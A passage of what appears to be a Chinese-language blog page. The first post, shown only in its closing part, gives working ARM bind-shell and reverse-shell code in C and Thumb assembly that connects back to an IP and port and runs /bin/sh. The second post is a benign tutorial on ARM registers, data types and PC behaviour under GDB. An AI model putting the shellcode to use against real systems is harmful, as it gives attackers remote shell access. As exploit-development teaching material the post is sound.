client_sockid</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r1</span>, <span class="number">#1</span>          <span class="comment">// r1 = 2 (stderr) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// execve(&quot;/bin/sh&quot;, 0, 0) </span></span><br><span class="line">    <span class="keyword">adr</span> <span class="built_in">r0</span>, shellcode   <span class="comment">// r0 = location of &quot;/bin/shX&quot;</span></span><br><span class="line">    <span class="keyword">eor</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span>      <span class="comment">// clear register r1. R1 = 0</span></span><br><span class="line">    <span class="keyword">eor</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span>      <span class="comment">// clear register r2. r2 = 0</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r0</span>, <span class="number">#7</span>]   <span class="comment">// store null-byte for AF_INET</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span>         <span class="comment">// execve syscall number</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">struct_addr:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x02\xff&quot;</span> <span class="comment">// AF_INET 0xff will be NULLed </span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x11\x5c&quot;</span> <span class="comment">// port number 4444 </span></span><br><span class="line"><span class="symbol">.byte</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span> <span class="comment">// IP Address </span></span><br><span class="line"><span class="symbol">shellcode:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/shX&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="reverse-shellcode"><a href="#reverse-shellcode" class="headerlink" title="reverse shellcode"></a>reverse shellcode</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> sockfd; <span class="comment">// socket file descriptor</span></span><br><span class="line"> <span class="keyword">socklen_t</span> socklen; <span class="comment">// socket-length for new connections</span></span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span> <span class="comment">// client address</span></span><br><span class="line"> </span><br><span class="line"> addr.sin_family = AF_INET; <span class="comment">// server socket type address family = internet protocol address</span></span><br><span class="line"> addr.sin_port = <span class="built_in">htons</span>( <span class="number">1337</span> ); <span class="comment">// connect-back port, converted to network byte order</span></span><br><span class="line"> addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>); <span class="comment">// connect-back ip , converted to network byte order</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// create new TCP socket</span></span><br><span class="line"> sockfd = <span class="built_in">socket</span>( AF_INET, SOCK_STREAM, IPPROTO_IP );</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// connect socket</span></span><br><span class="line"> <span class="built_in">connect</span>(sockfd, (struct sockaddr *)&amp;addr, <span class="built_in"><span class="keyword">sizeof</span></span>(addr));</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//  Duplicate file descriptors for STDIN, STDOUT and STDERR</span></span><br><span class="line"> <span class="built_in">dup2</span>(sockfd, <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">dup2</span>(sockfd, <span class="number">1</span>);</span><br><span class="line"> <span class="built_in">dup2</span>(sockfd, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// spawn shell</span></span><br><span class="line"> <span class="built_in">execve</span>( <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"> <span class="meta">.ARM</span></span><br><span class="line"> <span class="keyword">add</span>   <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span>       <span class="comment">// switch to thumb mode </span></span><br><span class="line"> <span class="keyword">bx</span>    <span class="built_in">r3</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.THUMB</span></span><br><span class="line"><span class="comment">// socket(2, 1, 0) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="number">#2</span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r1</span>, <span class="number">#1</span></span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#200</span></span><br><span class="line"> <span class="keyword">add</span>   <span class="built_in">r7</span>, <span class="number">#81</span>         <span class="comment">// r7 = 281 (socket) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span>              <span class="comment">// r0 = resultant sockfd </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r4</span>, <span class="built_in">r0</span>          <span class="comment">// save sockfd in r4 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// connect(r0, &amp;sockaddr, 16) </span></span><br><span class="line"> <span class="keyword">adr</span>   <span class="built_in">r1</span>, struct        <span class="comment">// pointer to address, port </span></span><br><span class="line"> <span class="keyword">strb</span>  <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#1</span>]    <span class="comment">// write 0 for AF_INET </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r2</span>, <span class="number">#16</span></span><br><span class="line"> <span class="keyword">add</span>   <span class="built_in">r7</span>, <span class="number">#2</span>          <span class="comment">// r7 = 283 (connect) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dup2(sockfd, 0) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#63</span>         <span class="comment">// r7 = 63 (dup2) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved sockfd </span></span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r1</span>, <span class="built_in">r1</span>          <span class="comment">// r1 = 0 (stdin) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"><span class="comment">// dup2(sockfd, 1) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved sockfd </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r1</span>, <span class="number">#1</span>          <span class="comment">// r1 = 1 (stdout) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"><span class="comment">// dup2(sockfd, 2) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="built_in">r4</span>         <span class="comment">// r4 is the saved sockfd </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r1</span>, <span class="number">#2</span>         <span class="comment">// r1 = 2 (stderr)</span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// execve(&quot;/bin/sh&quot;, 0, 0) </span></span><br><span class="line"> <span class="keyword">adr</span>   <span class="built_in">r0</span>, binsh</span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line"> <span class="keyword">strb</span>  <span class="built_in">r2</span>, [<span class="built_in">r0</span>, <span class="number">#7</span>]</span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#11</span>       <span class="comment">// r7 = 11 (execve) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">struct:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x02\xff&quot;</span>      <span class="comment">// AF_INET 0xff will be NULLed </span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x11\x5c&quot;</span>      <span class="comment">// port number 4444 </span></span><br><span class="line"><span class="symbol">.byte</span> <span class="number">192</span>,<span class="number">168</span>,<span class="number">139</span>,<span class="number">130</span>  <span class="comment">// IP Address </span></span><br><span class="line"><span class="symbol">binsh:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/shX&quot;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2021/08/16/ARM Shellcode的编写/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/11/Arm Instractions/" >ARM-Instractions</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-11  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
		
            
            <p class="post">&lt;h2 id=&#34;DATA-Types&#34;&gt;&lt;a href=&#34;#DATA-Types&#34; class=&#34;headerlink&#34; title=&#34;DATA Types&#34;&gt;&lt;/a&gt;DATA Types&lt;/h2&gt;&lt;p&gt;与高级语言相似，ARM支持操作不同类型的数据类型。我们可以load（or stroe）的数据类型有signed and unsigned words、halfwords、or bytes. 这些数据类型的extensions分别是：halfwords是-h or -sh，bytes是-b or -sb，word没有extension. signed and unsinged 数据的区别：&lt;br&gt;    1.signed data type 能储存正数和负数，因此范围较小&lt;br&gt;    2.unsigned data type 可以保存大的正值（包括“零”），但不能保存负值，因此范围更广。&lt;/p&gt;
&lt;p&gt;以下是一些load和store指令的操作指令的一些例子：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ldr = Load Word&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldrh = Load &lt;span class=&#34;keyword&#34;&gt;unsigned&lt;/span&gt; Half Word&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldrsh = Load &lt;span class=&#34;keyword&#34;&gt;signed&lt;/span&gt; Half Word&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldrb = Load &lt;span class=&#34;keyword&#34;&gt;unsigned&lt;/span&gt; Byte&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldrsb = Load &lt;span class=&#34;keyword&#34;&gt;signed&lt;/span&gt; Bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str = Store Word&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strh = Store &lt;span class=&#34;keyword&#34;&gt;unsigned&lt;/span&gt; Half Word&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strsh = Store &lt;span class=&#34;keyword&#34;&gt;signed&lt;/span&gt; Half Word&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strb = Store &lt;span class=&#34;keyword&#34;&gt;unsigned&lt;/span&gt; Byte&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strsb = Store &lt;span class=&#34;keyword&#34;&gt;signed&lt;/span&gt; Byte&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;查看内存中的字节有两种基本方式：Little-Endian (LE) 或 Big-Endian (BE)。 区别在于对象的每个字节存储在内存中的字节顺序。 在像 Intel x86 这样的小端机器上，最低有效字节存储在最低地址（最接近零的地址）。 在 big-endian 机器上，最高有效字节存储在最低地址。 ARM 体系结构在第 3 版之前是小端的，从那时起它是双端的，这意味着它具有允许可切换的端的设置。 例如，在 ARMv6 上，指令是固定的 little-endian，数据访问可以是 little-endian 或 big-endian，由程序状态寄存器 (CPSR) 的第 9 位（E 位）控制。&lt;/p&gt;
&lt;p&gt;寄存器的数量是依赖于ARM的版本的，通过查询ARM Reference Manual，除了基于 ARMv6-M 和 ARMv7-M 的处理器外，都有 30 个通用 32 位寄存器，前 16 个寄存器(r1-r15)可在用户级模式下访问，其他寄存器可在特权软件执行中使用（ARMv6-M 和 ARMv7-M 除外）。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;#&lt;/th&gt;
&lt;th&gt;Alias&lt;/th&gt;
&lt;th&gt;Purpose&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;R0&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;General purppose&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;R1&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;General purppose&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;R2&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;General purppose&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;R3&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;General purppose&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;R4&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;General purppose&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;R5&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;General purppose&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;R6&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;General purppose&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
<p>
		

	

	</div>
  <a type="button" href="/2021/08/11/Arm Instractions/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="DATA-Types"><a href="#DATA-Types" class="headerlink" title="DATA Types"></a>DATA Types</h2><p>与高级语言相似，ARM支持操作不同类型的数据类型。我们可以load（or stroe）的数据类型有signed and unsigned words、halfwords、or bytes. 这些数据类型的extensions分别是：halfwords是-h or -sh，bytes是-b or -sb，word没有extension. signed and unsinged 数据的区别：<br>    1.signed data type 能储存正数和负数，因此范围较小<br>    2.unsigned data type 可以保存大的正值（包括“零”），但不能保存负值，因此范围更广。</p>
<p>以下是一些load和store指令的操作指令的一些例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldr = Load Word</span><br><span class="line">ldrh = Load <span class="keyword">unsigned</span> Half Word</span><br><span class="line">ldrsh = Load <span class="keyword">signed</span> Half Word</span><br><span class="line">ldrb = Load <span class="keyword">unsigned</span> Byte</span><br><span class="line">ldrsb = Load <span class="keyword">signed</span> Bytes</span><br><span class="line"></span><br><span class="line">str = Store Word</span><br><span class="line">strh = Store <span class="keyword">unsigned</span> Half Word</span><br><span class="line">strsh = Store <span class="keyword">signed</span> Half Word</span><br><span class="line">strb = Store <span class="keyword">unsigned</span> Byte</span><br><span class="line">strsb = Store <span class="keyword">signed</span> Byte</span><br></pre></td></tr></table></figure>

<p>查看内存中的字节有两种基本方式：Little-Endian (LE) 或 Big-Endian (BE)。 区别在于对象的每个字节存储在内存中的字节顺序。 在像 Intel x86 这样的小端机器上，最低有效字节存储在最低地址（最接近零的地址）。 在 big-endian 机器上，最高有效字节存储在最低地址。 ARM 体系结构在第 3 版之前是小端的，从那时起它是双端的，这意味着它具有允许可切换的端的设置。 例如，在 ARMv6 上，指令是固定的 little-endian，数据访问可以是 little-endian 或 big-endian，由程序状态寄存器 (CPSR) 的第 9 位（E 位）控制。</p>
<p>寄存器的数量是依赖于ARM的版本的，通过查询ARM Reference Manual，除了基于 ARMv6-M 和 ARMv7-M 的处理器外，都有 30 个通用 32 位寄存器，前 16 个寄存器(r1-r15)可在用户级模式下访问，其他寄存器可在特权软件执行中使用（ARMv6-M 和 ARMv7-M 除外）。</p>
<table>
<thead>
<tr>
<th>#</th>
<th>Alias</th>
<th>Purpose</th>
</tr>
</thead>
<tbody><tr>
<td>R0</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R1</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R2</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R3</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R4</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R5</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R6</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R7</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R8</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R9</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R10</td>
<td>-</td>
<td>General purppose</td>
</tr>
<tr>
<td>R11</td>
<td>FP</td>
<td>Frame Pointer</td>
</tr>
<tr>
<td>R12</td>
<td>IP</td>
<td>Instra Procedural Call</td>
</tr>
<tr>
<td>R13</td>
<td>SP</td>
<td>Stack Pointer</td>
</tr>
<tr>
<td>R14</td>
<td>LR</td>
<td>Link Register</td>
</tr>
<tr>
<td>R15</td>
<td>PC</td>
<td>Program Counter</td>
</tr>
<tr>
<td>CPSR</td>
<td>-</td>
<td>Current Program Status Register</td>
</tr>
</tbody></table>
<p>下表只是快速了解 ARM 寄存器如何与 Intel 处理器中的寄存器相关联。</p>
<table>
<thead>
<tr>
<th>ARM</th>
<th>Description</th>
<th>x86</th>
</tr>
</thead>
<tbody><tr>
<td>R0</td>
<td>General Purpose</td>
<td>EAX</td>
</tr>
<tr>
<td>R1-R5</td>
<td>General Purpose</td>
<td>EBX, ECX, EDX, ESI, EDI</td>
</tr>
<tr>
<td>R6-R10</td>
<td>General Purpose</td>
<td>–</td>
</tr>
<tr>
<td>R11 (FP)</td>
<td>Frame Pointer</td>
<td>EBP</td>
</tr>
<tr>
<td>R12</td>
<td>Intra Procedural Call</td>
<td>–</td>
</tr>
<tr>
<td>R13 (SP)</td>
<td>Stack Pointer</td>
<td>ESP</td>
</tr>
<tr>
<td>R14 (LR)</td>
<td>Link Register</td>
<td>–</td>
</tr>
<tr>
<td>R15 (PC)</td>
<td>&lt;- Program Counter / Instruction Pointer -&gt;</td>
<td>EIP</td>
</tr>
<tr>
<td>CPSR</td>
<td>Current Program State Register/Flags</td>
<td>EFLAGS</td>
</tr>
</tbody></table>
<p>R0-R12：在普通的操作中可以被用作储存临时数据、指针等等。例如，R0 可在算术运算期间称为累加器或用于存储先前调用函数的结果。 R7 在处理系统调用时变得有用，因为它存储系统调用编号，而 R11 帮助我们跟踪用作帧指针的堆栈边界。 此外，ARM 上的函数调用约定指定函数的前四个参数存储在寄存器 r0-r3 中。</p>
<p>R13：SP(Stack Pointer). 这个栈指针指向栈顶，栈是用于特定于函数的存储的内存区域，在函数返回时被回收。 因此，栈指针用于在栈上分配空间，方法是从栈指针中减去我们想要分配的值（以字节为单位）。 换句话说，如果我们想分配一个 32 位的值，我们从栈指针中减去 4。</p>
<p>R14:LR(Link Register). 当一个函数调用被执行了，链接寄存器就会更新为下一条指令的内存地址。止痒允许程序在子函数完成后返回到父函数中接着执行。</p>
<p>R15:PC(Program Counter).程序计数器根据所执行指令的大小自动递增。 此大小在 ARM 状态下始终为 4 个字节，在 THUMB 模式下始终为 2 个字节。 当执行分支指令时，PC 持有目的地址。 在执行过程中，PC 在 ARM 状态下存储当前指令加 8（两条 ARM 指令）的地址，在 Thumb(v1) 状态下存储当前指令加 4（两条 Thumb 指令）的地址。 这与 x86 不同，在 x86 中 PC 总是指向要执行的下一条指令。</p>
<h3 id="下面在调试器下看一下PC寄存器的行为"><a href="#下面在调试器下看一下PC寄存器的行为" class="headerlink" title="下面在调试器下看一下PC寄存器的行为"></a>下面在调试器下看一下PC寄存器的行为</h3><p>源程序如下：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"> <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">pc</span></span><br><span class="line"> <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#2</span></span><br><span class="line"> <span class="keyword">add</span> <span class="built_in">r2</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line"> bkpt</span><br></pre></td></tr></table></figure>

<p>在GDB中我们设置断点_start然后运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; b _start</span><br><span class="line">Breakpoint 1 at 0x10054</span><br><span class="line">gef&gt; r</span><br></pre></td></tr></table></figure>

<p>断点的现场状态如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x00010054 in _start ()</span><br><span class="line">---------------------------------------------------------------[ registers ]----</span><br><span class="line">$r0   : 0x00000000</span><br><span class="line">$r1   : 0x00000000</span><br><span class="line">$r2   : 0x00000000</span><br><span class="line">$r3   : 0x00000000</span><br><span class="line">$r4   : 0x00000000</span><br><span class="line">$r5   : 0x00000000</span><br><span class="line">$r6   : 0x00000000</span><br><span class="line">$r7   : 0x00000000</span><br><span class="line">$r8   : 0x00000000</span><br><span class="line">$r9   : 0x00000000</span><br><span class="line">$r10  : 0x00000000</span><br><span class="line">$r11  : 0x00000000</span><br><span class="line">$r12  : 0x00000000</span><br><span class="line">$sp   : 0xbefff3b0 -&gt; 0x00000001</span><br><span class="line">$lr   : 0x00000000</span><br><span class="line">$pc   : 0x00010054 -&gt; &lt;_start+0&gt; mov r0,  pc</span><br><span class="line">$cpsr : [thumb fast interrupt overflow carry zero negative]</span><br><span class="line">-------------------------------------------------------------------[ stack ]----</span><br><span class="line">0xbefff3b0|+0x00: 0x00000001    &lt;-$sp</span><br><span class="line">0xbefff3b4|+0x04: 0xbefff51c -&gt; &quot;/home/pi/asm/test_pc&quot;</span><br><span class="line">0xbefff3b8|+0x08: 0x00000000</span><br><span class="line">0xbefff3bc|+0x0c: 0xbefff531 -&gt; 0x49464e49</span><br><span class="line">0xbefff3c0|+0x10: 0xbefff56b -&gt; &quot;XDG_SESSION_ID=c2&quot;</span><br><span class="line">0xbefff3c4|+0x14: 0xbefff57d -&gt; &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xbefff3c8|+0x18: 0xbefff58d -&gt; &quot;TERM=xterm&quot;</span><br><span class="line">0xbefff3cc|+0x1c: 0xbefff598 -&gt; 0x49464e49</span><br><span class="line">-------------------------------------------------------------[ code:armv5t ]----</span><br><span class="line">      0x1003c                  andeq  r0,  r1,  r0</span><br><span class="line">      0x10040                  andeq  r0,  r1,  r0</span><br><span class="line">      0x10044                  andeq  r0,  r0,  r4,  rrx</span><br><span class="line">      0x10048                  andeq  r0,  r0,  r4,  rrx</span><br><span class="line">      0x1004c                  andeq  r0,  r0,  r5</span><br><span class="line">      0x10050                  andeq  r0,  r1,  r0</span><br><span class="line">-&gt;   0x10054 &lt;_start+0&gt;       mov    r0,  pc</span><br><span class="line">      0x10058 &lt;_start+4&gt;       mov    r1,  #2</span><br><span class="line">      0x1005c &lt;_start+8&gt;       add    r2,  r1,  r1</span><br><span class="line">      0x10060 &lt;_start+12&gt;      bkpt   0x0000</span><br><span class="line">      0x10064                  andeq  r1,  r0,  r1,  asr 